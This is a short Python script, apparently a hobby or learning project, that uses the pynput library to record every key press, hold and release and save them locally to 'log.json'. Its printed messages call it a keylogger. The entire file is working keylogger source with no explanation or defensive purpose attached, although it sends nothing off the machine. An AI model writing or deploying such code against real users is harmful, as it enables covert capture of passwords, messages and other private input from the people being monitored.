
from pynput import keyboard
import json

key_list = []
x = False
key_strokes = ""


def update_json_file(key_list):
    with open('log.json', 'w') as key_log:
        json.dump(key_list, key_log)


def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'pressed': f'{key}'})
        x = True
    else:
        key_list.append({'Held': f'{key}'})

    update_json_file(key_list)


def on_release(key):
    global x, key_list
    key_list.append({'Released': f'{key}'})

    if x:
        x = False

    update_json_file(key_list)


print("[+] Running keylogger successfully")
print("[:] Saving the key logs in 'log.json'")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
